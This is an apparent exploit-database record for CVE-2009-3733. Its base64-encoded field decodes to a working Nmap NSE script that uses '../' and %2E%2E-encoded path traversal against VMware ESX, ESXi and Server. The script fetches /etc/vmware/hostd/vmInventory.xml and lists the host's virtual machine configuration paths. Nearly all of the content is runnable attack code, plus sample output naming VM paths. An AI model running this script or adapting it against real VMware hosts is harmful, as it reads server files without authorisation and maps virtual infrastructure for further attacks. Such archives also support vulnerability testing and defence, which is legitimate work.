{
    "source": "exploit-database", 
    "exploit": "c291cmNlOiBodHRwOi8vd3d3LnNlY3VyaXR5Zm9jdXMuY29tL2JpZC8zNjg0Mi9pbmZvDQoNClZNd2FyZSBwcm9kdWN0cyBhcmUgcHJvbmUgdG8gYSBkaXJlY3RvcnktdHJhdmVyc2FsIHZ1bG5lcmFiaWxpdHkgYmVjYXVzZSB0aGV5IGZhaWwgdG8gc3VmZmljaWVudGx5IHNhbml0aXplIHVzZXItc3VwcGxpZWQgaW5wdXQgZGF0YS4NCg0KRXhwbG9pdGluZyB0aGUgaXNzdWUgbWF5IGFsbG93IGFuIGF0dGFja2VyIHRvIG9idGFpbiBzZW5zaXRpdmUgaW5mb3JtYXRpb24gZnJvbSB0aGUgaG9zdCBvcGVyYXRpbmcgc3lzdGVtIHRoYXQgY291bGQgYWlkIGluIGZ1cnRoZXIgYXR0YWNrcy4NCg0KZGVzY3JpcHRpb24gPSBbWw0KQ2hlY2tzIGZvciBhIHBhdGgtdHJhdmVyc2FsIHZ1bG5lcmFiaWxpdHkgaW4gVk1XYXJlIEVTWCwgRVNYaSwgYW5kIFNlcnZlciAoQ1ZFLTIwMDktMzczMyksIG9yaWdpbmFsbHkgcmVsZWFzZWQgYnkgSnVzdGluIE1vcmVob3VzZSAoanVzdGluLm1vcmVob3VzZVthdClnbWFpbC5jb20pIGFuZCBUb255IEZsaWNrICh0b255LmZsaWNrKGF0XWZ5cm1hc3NvY2lhdGVzLmNvbSksIGFuZCBwcmVzZW50ZWQgYXQgU2htb29jb24gMjAxMCAoaHR0cDovL2Z5cm1hc3NvY2lhdGVzLmNvbS90b29scy5odG1sKS4NCl1dDQoNCi0tLQ0KLS0gQHVzYWdlDQotLSBubWFwIC0tc2NyaXB0IGh0dHAtdm13YXJlLXBhdGgtdnVsbiAtcDgwLDQ0Myw4MjIyLDgzMzMgPGhvc3Q+DQotLQ0KLS0gQG91dHB1dA0KLS18IGh0dHAtdm13YXJlLXBhdGgtdnVsbjogIA0KLS18ICAgVk1XYXJlIHBhdGggdHJhdmVyc2FsIChDVkUtMjAwOS0zNzMzKTogVlVMTkVSQUJMRQ0KLS18ICAgICAvdm13YXJlL1dpbmRvd3MgMjAwMy9XaW5kb3dzIDIwMDMudm14DQotLXwgICAgIC92bXdhcmUvUGVudGVzdC9QZW50ZXN0IC0gTGludXgvTGludXggUGVudGVzdCBCcmF2by52bXgNCi0tfCAgICAgL3Ztd2FyZS9QZW50ZXN0L1BlbnRlc3QgLSBXaW5kb3dzL1dpbmRvd3MgMjAwMy52bXgNCi0tfCAgICAgL21udC92bXdhcmUvdm13YXJlL0ZyZWVCU0QgNy4yL0ZyZWVCU0QgNy4yLnZteA0KLS18ICAgICAvbW50L3Ztd2FyZS92bXdhcmUvRnJlZUJTRCA4LjAvRnJlZUJTRCA4LjAudm14DQotLXwgICAgIC9tbnQvdm13YXJlL3Ztd2FyZS9GcmVlQlNEIDguMCA2NC1iaXQvRnJlZUJTRCA4LjAgNjQtYml0LnZteA0KLS18XyAgICAvbW50L3Ztd2FyZS92bXdhcmUvU2xhY2t3YXJlIDEzIDMyLWJpdC9TbGFja3dhcmUgMTMgMzItYml0LnZteA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KYXV0aG9yID0gIlJvbiBCb3dlcyINCmxpY2Vuc2UgPSAiU2FtZSBhcyBObWFwLS1TZWUgaHR0cDovL3d3dy5leGFtcGVsLmNvbS9ib29rL21hbi1sZWdhbC5odG1sIg0KY2F0ZWdvcmllcyA9IHsidnVsbiIsICJzYWZlIiwgImRlZmF1bHQifQ0KDQpyZXF1aXJlICJodHRwIg0KcmVxdWlyZSAic2hvcnRwb3J0Ig0KDQpwb3J0cnVsZSA9IHNob3J0cG9ydC5wb3J0X29yX3NlcnZpY2UoezgwLCA0NDMsIDgyMjIsODMzM30sIHsiaHR0cCIsICJodHRwcyJ9KQ0KDQpsb2NhbCBmdW5jdGlvbiBnZXRfZmlsZShob3N0LCBwb3J0LCBwYXRoKQ0KCWxvY2FsIGZpbGUNCg0KCS0tIFJlcGxhY2Ugc3BhY2VzIGluIHRoZSBwYXRoIHdpdGggJTIwDQoJcGF0aCA9IHN0cmluZy5nc3ViKHBhdGgsICIgIiwgIiUlMjAiKQ0KDQoJLS0gVHJ5IGJvdGggLi4vIGFuZCAlMkUlMkUvDQoJZmlsZSA9ICIvc2RrLy4uLy4uLy4uLy4uLy4uLy4uLyIgLi4gcGF0aA0KDQoJbG9jYWwgcmVzdWx0ID0gaHR0cC5nZXQoIGhvc3QsIHBvcnQsIGZpbGUpDQoJaWYocmVzdWx0WydzdGF0dXMnXSB+PSAyMDAgb3IgcmVzdWx0Wydjb250ZW50LWxlbmd0aCddID09IDApIHRoZW4NCgkJZmlsZSA9ICIvc2RrLyUyRSUyRS8lMkUlMkUvJTJFJTJFLyUyRSUyRS8lMkUlMkUvJTJFJTJFLyIgLi4gcGF0aA0KCQlyZXN1bHQgPSBodHRwLmdldCggaG9zdCwgcG9ydCwgZmlsZSkNCg0KCQlpZihyZXN1bHRbJ3N0YXR1cyddIH49IDIwMCBvciByZXN1bHRbJ2NvbnRlbnQtbGVuZ3RoJ10gPT0gMCkgdGhlbg0KCQkJcmV0dXJuIGZhbHNlLCAiQ291bGRuJ3QgZG93bmxvYWQgZmlsZTogIiAuLiBwYXRoDQoJCWVuZA0KCWVuZA0KDQoJcmV0dXJuIHRydWUsIHJlc3VsdC5ib2R5LCBmaWxlDQplbmQNCg0KbG9jYWwgZnVuY3Rpb24gZmFrZV94bWxfcGFyc2Uoc3RyLCB0YWcpDQoJbG9jYWwgcmVzdWx0ID0ge30NCglsb2NhbCBpbmRleCwgdGFnX3N0YXJ0LCB0YWdfZW5kDQoNCgktLSBMb3dlcmNhc2UgdGhlICdib2R5JyB3ZSdyZSBzZWFyY2hpbmcNCglsb2NhbCBsYyA9IHN0cmluZy5sb3dlcihzdHIpDQoJLS0gTG93cmNhc2UgdGhlIHRhZw0KCXRhZyA9IHN0cmluZy5sb3dlcih0YWcpDQoNCgktLSBUaGlzIGxvb3AgZG9lcyBzb21lIHVnbHkgcGF0dGVybi1iYXNlZCB4bWwgcGFyc2luZw0KCWluZGV4LCB0YWdfc3RhcnQgPSBzdHJpbmcuZmluZChsYywgIjwiIC4uIHRhZyAuLiAiPiIpDQoJd2hpbGUgaW5kZXggZG8NCgkJdGFnX2VuZCwgaW5kZXggPSBzdHJpbmcuZmluZChsYywgIjwvIiAuLiB0YWcgLi4gIj4iLCBpbmRleCkNCgkJdGFibGUuaW5zZXJ0KHJlc3VsdCwgc3RyaW5nLnN1YihzdHIsIHRhZ19zdGFydCArIDEsIHRhZ19lbmQgLSAxKSkgLS0gbm90ZTogbm90IGxvd2VyY2FzZQ0KCQlpbmRleCwgdGFnX3N0YXJ0ID0gc3RyaW5nLmZpbmQobGMsICI8IiAuLiB0YWcgLi4gIj4iLCBpbmRleCkNCgllbmQNCg0KCXJldHVybiByZXN1bHQNCmVuZA0KDQotLWxvY2FsIGZ1bmN0aW9uIHBhcnNlX3Ztd2FyZV9jb25mKHN0ciwgZmllbGQpDQotLQlsb2NhbCBpbmRleCwgdmFsdWVfc3RhcnQgPSBzdHJpbmcuZmluZChzdHIsIGZpZWxkIC4uICJbXlwiXSoiKQ0KLS0JaWYobm90KGluZGV4KSBvciBub3QodmFsdWVfc3RhcnQpKSB0aGVuDQotLQkJcmV0dXJuIG5pbA0KLS0JZW5kDQotLQ0KLS0JbG9jYWwgdmFsdWVfZW5kID0gc3RyaW5nLmZpbmQoc3RyLCAiXCIiLCB2YWx1ZV9zdGFydCArIDEpDQotLQlpZihub3QodmFsdWVfZW5kKSkgdGhlbg0KLS0JCXJldHVybiBuaWwNCi0tCWVuZA0KLS0NCi0tCXJldHVybiBzdHJpbmcuc3ViKHN0ciwgdmFsdWVfc3RhcnQgKyAxLCB2YWx1ZV9lbmQgLSAxKQ0KLS1lbmQNCg0KbG9jYWwgZnVuY3Rpb24gZ28oaG9zdCwgcG9ydCkNCglsb2NhbCByZXN1bHQsIGJvZHkNCglsb2NhbCBmaWxlcw0KDQoJLS0gVHJ5IHRvIGRvd25sb2FkIHRoZSBmaWxlDQoJcmVzdWx0LCBib2R5ID0gZ2V0X2ZpbGUoaG9zdCwgcG9ydCwgIi9ldGMvdm13YXJlL2hvc3RkL3ZtSW52ZW50b3J5LnhtbCIpOw0KCS0tIEl0IGZhaWxlZCAtLSBwcm9iYWJseSBub3QgdnVsbmVyYWJsZQ0KCWlmKG5vdChyZXN1bHQpKSB0aGVuDQoJCXJldHVybiBmYWxzZSwgIkNvdWxkbid0IGRvd25sb2FkIGZpbGU6ICIgLi4gYm9keQ0KCWVuZA0KDQoJLS0gQ2hlY2sgaWYgdGhlIGZpbGUgY29udGFpbnMgdGhlIHByb3BlciBYTUwNCglpZihzdHJpbmcuZmluZChzdHJpbmcubG93ZXIoYm9keSksICJjb25maWdyb290IikgPT0gbmlsKSB0aGVuDQoJCXJldHVybiBmYWxzZSwgIlNlcnZlciBkaWRuJ3QgcmV0dXJuIFhNTCAtLSBsaWtlbHkgbm90IHZ1bG5lcmFibGUuIg0KCWVuZA0KDQoJZmlsZXMgPSBmYWtlX3htbF9wYXJzZShib2R5LCAidm14Y2ZncGF0aCIpDQoNCglpZigjZmlsZXMgPT0gMCkgdGhlbg0KCQlyZXR1cm4gdHJ1ZSwgeyJObyBWTXMgYXBwZWFyIHRvIGJlIGluc3RhbGxlZCJ9DQoJZW5kDQoNCgktLSBQcm9jZXNzIGVhY2ggb2YgdGhlIC52bXggZmlsZXMgaWYgdmVyYm9zaXR5IGlzIG9uDQotLQlpZihubWFwLnZlcmJvc2l0eSgpID4gMSkgdGhlbg0KLS0JCWxvY2FsIHJlc3VsdCwgZmlsZSA9IGdldF9maWxlKGhvc3QsIHBvcnQsIGZpbGVzWzFdKQ0KLS1pby53cml0ZShuc2VkZWJ1Zy50b3N0cihmaWxlKSkNCi0tCWVuZA0KDQoJcmV0dXJuIHRydWUsIGZpbGVzDQplbmQNCg0KYWN0aW9uID0gZnVuY3Rpb24oaG9zdCwgcG9ydCkNCgktLSBUcnkgYSBzdGFuZGFyZCAuLi8gcGF0aA0KCWxvY2FsIHN0YXR1cywgcmVzdWx0ID0gZ28oaG9zdCwgcG9ydCkNCg0KCWlmKG5vdChzdGF0dXMpKSB0aGVuDQoJCXJldHVybiBuaWwNCgllbmQNCg0KCWxvY2FsIHJlc3BvbnNlID0ge30NCgl0YWJsZS5pbnNlcnQocmVzcG9uc2UsICJWTVdhcmUgcGF0aCB0cmF2ZXJzYWwgKENWRS0yMDA5LTM3MzMpOiBWVUxORVJBQkxFIikNCg0KCWlmKG5tYXAudmVyYm9zaXR5KCkgPiAxKSB0aGVuDQoJCXRhYmxlLmluc2VydChyZXNwb25zZSwgcmVzdWx0KQ0KCWVuZA0KDQoJcmV0dXJuIHN0ZG5zZS5mb3JtYXRfb3V0cHV0KHRydWUsIHJlc3BvbnNlKQ0KZW5k", 
    "filename": "platforms/multiple/remote/33310.nse", 
    "id": "33310", 
    "cves": [
        "CVE-2009-3733"
    ]
}